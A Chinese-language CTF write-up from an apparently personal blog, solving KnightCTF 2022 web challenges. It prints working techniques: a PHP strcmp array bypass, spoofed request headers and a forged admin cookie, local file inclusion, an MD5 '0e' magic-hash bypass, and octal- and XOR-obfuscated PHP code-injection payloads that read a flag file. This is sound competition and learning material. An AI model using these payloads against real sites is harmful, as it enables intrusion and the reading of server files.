---
title: "KnightCTF2022 Wp"
slug: "knightctf2022-wp"
description: "比较简单的题，基本都做出来了，水一篇wp"
date: 2022-01-24T17:47:53+08:00
categories: ["CTF"]
series: []
tags: ["wp"]
draft: false
toc: true
---

https://knightctf.com/challenges

https://ctftime.org/event/1545/tasks/

标`-`的两道题是脑子短路了，赛后出的

----

## Sometime you need to look wayback

https://github.com/KCTF202x/repo101/commits/main

![image-20220121231047134](https://raw.githubusercontent.com/AmiaaaZ/ImageOverCloud/master/wpImg/image-20220121231047134.png)

`KCTF{version_control_is_awesome}`

## Do Something Special

http://do-something-special.kshackzone.com/

页面按钮重定向至`/gr@b_y#ur_fl@g_h3r3!`，由于url的截断，`#`和后面的内容我们urlencode一下

`KCTF{Sp3cial_characters_need_t0_get_Url_enc0ded}`

## Obsfuscation Isn't Enough

很长的jsfuck，控制台

```
if (document.forms[0].username.value == "83fe2a837a4d4eec61bd47368d86afd6" && document.forms[0].password.value == "a3fa67479e47116a4d6439120400b057") document.location = "150484514b6eeb1d99da836d95f6671d.php"
```

http://obsfication.kshackzone.com/150484514b6eeb1d99da836d95f6671d.php

`KCTF{0bfuscat3d_J4v4Scr1pt_aka_JSFuck}`

## -Zero is not the limit

有user1到user5，没有user0

然后没解出来，看wp就有点无语

```
/user/-1
```

……

## Find Pass Code - 1

页面提示`/?source=1`可看源码

```
<?php
require "flag.php";
if (isset($_POST["pass_code"])) {
    if (strcmp($_POST["pass_code"], $flag) == 0 ) {
        echo "KCTF Flag : {$flag}";
    } else {
        echo "Oh....My....God. You entered the wrong pass code.<br>";
    }
}
if (isset($_GET["source"])) {
    print show_source(__FILE__);
}

?>
```

用了`strcmp`，我们直接数组绕过

```
pass_code=KCTF
```

`KCTF{ShOuLd_We_UsE_sTrCmP_lIkE_tHaT}`

## Most Secure Calculator

```
readfile('flag.txt');
```

`KCTF{WaS_mY_cAlCuLaToR_sAfE}`

## Can you be Admin?

典，请求头的题

```
User-Agent: KnightSquad
Referer: localhost
POST: username=tareq&password=IamKnight&submit=Login
```

```
/dashboard.php
User-Agent: KnightSquad
Referer: localhost
Cookie: VXNlcl9UeXBl=QWRtaW4=
```

更典的是总有模糊不清的提示

`KCTF{FiN4LlY_y0u_ar3_4dm1N}`

## My PHP Site

`/?file=`文件包含点，php伪协议看页面源码

```
<?php

if(isset($_GET['file'])){
    if ($_GET['file'] == "index.php") {
        echo "<h1>ERROR!!</h1>";
        die();
    }else{
        include $_GET['file'];
    }

}else{
    echo "<h1>You are missing the file parameter</h1>";

    #note :- secret location /home/tareq/s3crEt_fl49.txt
}

?>
```

直接包含s3crEt_fl49.txt就行，不用绝对路径

`KCTF{L0C4L_F1L3_1ncLu710n}`

## -Bypass!! Bypass!! Bypass!!

页面源码提示/api/request/auth_token，post，得到token=nrpd935q5g77b0kr7iaiwi0aesa7m79xqu4n99hi，然后我尝试了很多get post参数，还有cookie，都不行

看wp才知道这里应该使用`X-Authorized-For`请求头

`KCTF{cOngRatUlaT10Ns_wElCoMe_t0_y0ur_daShBoaRd}`

## Find Pass Code - 2

跟之前一样的方式看源码`/?source=1`

```
<?php
require "flag.php";
$old_pass_codes = array("0e215962017", "0e730083352", "0e807097110", "0e840922711");
$old_pass_flag = false;
if (isset($_POST["pass_code"]) && !is_array($_POST["pass_code"])) {
    foreach ($old_pass_codes as $old_pass_code) {
        if ($_POST["pass_code"] === $old_pass_code) {
            $old_pass_flag = true;
            break;
        }
    }
    if ($old_pass_flag) {
        echo "Sorry ! It's an old pass code.";
    } else if ($_POST["pass_code"] == md5($_POST["pass_code"])) {
        echo "KCTF Flag : {$flag}";
    } else {
        echo "Oh....My....God. You entered the wrong pass code.<br>";
    }
}
if (isset($_GET["source"])) {
    print show_source(__FILE__);
}

?>
```

典，0e绕过，0e1137126905

`KCTF{ShOuD_wE_cOmPaRe_MD5_LiKe_ThAt__Be_SmArT}`

## Most Secure Calculator - 2

8进制，依旧是`readfile('flag.txt')`

```
("\162\145\141\144\146\151\154\145")("\146\154\141\147\56\164\170\164")
```

discord上还看到很多xor的payload，也很好

```
("538869"^"~4~2-~"^"8~5~~*")(("378#"^"~(2,"^".~~%"))
```

```
("393480"^"@@@@]]")(("8!4@80!8"^"[@@`^@_").(".").("484"^"@@@"))
```